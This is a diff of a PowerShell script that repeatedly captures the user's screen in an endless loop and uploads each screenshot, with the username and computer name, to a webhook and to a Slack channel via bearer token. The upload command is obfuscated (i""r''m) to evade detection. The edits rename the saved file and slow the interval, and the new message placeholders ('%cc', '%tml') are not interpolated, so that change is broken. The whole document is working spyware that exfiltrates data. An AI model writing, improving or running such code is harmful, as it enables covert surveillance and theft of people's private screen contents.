@@ -19,62 +19,64 @@ while(1){
 
   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
 
-  $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png")
+  $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\crab.png")
   $graphics.Dispose()
   $bmp.Dispose()
   
-  start-sleep -Seconds 1
+  start-sleep -Seconds 5
 
-   try { $ffp = Join-Path -Path $env:USERPROFILE -ChildPath '\AppData\Local\Temp\' + $env:computername + '-Capture.png' } catch {}
-    if (Test-Path $ffp) {
-        $uu = $env:USERNAME
-        try { $fb = [System.IO.File]::ReadAllBytes($ffp) } catch { continue }
-        $bd = [System.Guid]::NewGuid().ToString()
-        $lf = "`r`n"
-        $pt1 = @{
-            "username" = $uu
-            "content"  = "`**Found screenshot:`** $ffp"
-        } | ConvertTo-Json -Compress
-        $q1t = (
-            "--$bd",
-            "Content-Disposition: form-data; name=`"payload_json`"",
-            "Content-Type: application/json",
-            "",
-            $pt1,
-            "--$bd",
-            "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path -Leaf $ffp)`"",
-            "Content-Type: application/octet-stream",
-            "",
-            [System.Text.Encoding]::UTF8.GetString($fb),
-            "--$bd--"
-        ) -join $lf
-        $hh = @{
-            "Content-Type" = "multipart/form-data; boundary=$bd"
-        }
-        i""r''m -Uri $dwbt -Method Post -Headers $hh -Body $q1t > $null
-    
-        $st1 = "https://slack.com/api/files.getUploadURLExternal?filename=" + $(Split-Path -Leaf $ffp) + "&length=" + $fb.Length
-        $sh = @{
-            "Authorization" = "Bearer $sat"
-            "Content-Type"  = "application/x-www-form-urlencoded"
-        }
-        $luur = i""r''m -Uri $st1 -Method Get -Headers $sh
-        if ($luur.upload_url) {
-            $suh = @{
-                "Content-Type" = "application/octet-stream"
-            }
-            i""r''m -Uri $luur.upload_url -Method Post -Headers $suh -Body $fb > $null
-            $scu = "https://slack.com/api/files.completeUploadExternal"
-            $scb = @{
-                "files" = @(@{ "id" = $luur.file_id; "title" = "$(Split-Path -Leaf $ffp)" })
-                "channel_id" = "C08F8RJ84P5"
-                "initial_comment"  = "`*Found screenshot:`* $ffp"
-            } | ConvertTo-Json -Compress
-            $sh = @{
-                "Authorization" = "Bearer $sat"
-                "Content-Type"  = "application/json"
-            }
-            i""r''m -Uri $scu -Method Post -Headers $sh -Body $scb > $null 
-        }
-    }
+  try { $ffp = Join-Path -Path $env:USERPROFILE -ChildPath '\AppData\Local\Temp\crab.png' } catch {}
+  if (Test-Path $ffp) {
+      $uu = $env:USERNAME
+      $cc = $env:computername
+      $tml = (Get-Date -Format HHmmss)
+      try { $fb = [System.IO.File]::ReadAllBytes($ffp) } catch { continue }
+      $bd = [System.Guid]::NewGuid().ToString()
+      $lf = "`r`n"
+      $pt1 = @{
+          "username" = $uu
+          "content"  = "`**Screenshot Captured For %cc At %tml`**"
+      } | ConvertTo-Json -Compress
+      $q1t = (
+          "--$bd",
+          "Content-Disposition: form-data; name=`"payload_json`"",
+          "Content-Type: application/json",
+          "",
+          $pt1,
+          "--$bd",
+          "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path -Leaf $ffp)`"",
+          "Content-Type: application/octet-stream",
+          "",
+          [System.Text.Encoding]::UTF8.GetString($fb),
+          "--$bd--"
+      ) -join $lf
+      $hh = @{
+          "Content-Type" = "multipart/form-data; boundary=$bd"
+      }
+      i""r''m -Uri $dwbt -Method Post -Headers $hh -Body $q1t > $null
+  
+      $st1 = "https://slack.com/api/files.getUploadURLExternal?filename=" + $(Split-Path -Leaf $ffp) + "&length=" + $fb.Length
+      $sh = @{
+          "Authorization" = "Bearer $sat"
+          "Content-Type"  = "application/x-www-form-urlencoded"
+      }
+      $luur = i""r''m -Uri $st1 -Method Get -Headers $sh
+      if ($luur.upload_url) {
+          $suh = @{
+              "Content-Type" = "application/octet-stream"
+          }
+          i""r''m -Uri $luur.upload_url -Method Post -Headers $suh -Body $fb > $null
+          $scu = "https://slack.com/api/files.completeUploadExternal"
+          $scb = @{
+              "files" = @(@{ "id" = $luur.file_id; "title" = "$(Split-Path -Leaf $ffp)" })
+              "channel_id" = "C08F8RJ84P5"
+              "initial_comment"  = "`*Screenshot Captured For %cc At %tml`*"
+          } | ConvertTo-Json -Compress
+          $sh = @{
+              "Authorization" = "Bearer $sat"
+              "Content-Type"  = "application/json"
+          }
+          i""r''m -Uri $scu -Method Post -Headers $sh -Body $scb > $null 
+      }
+  }
 }
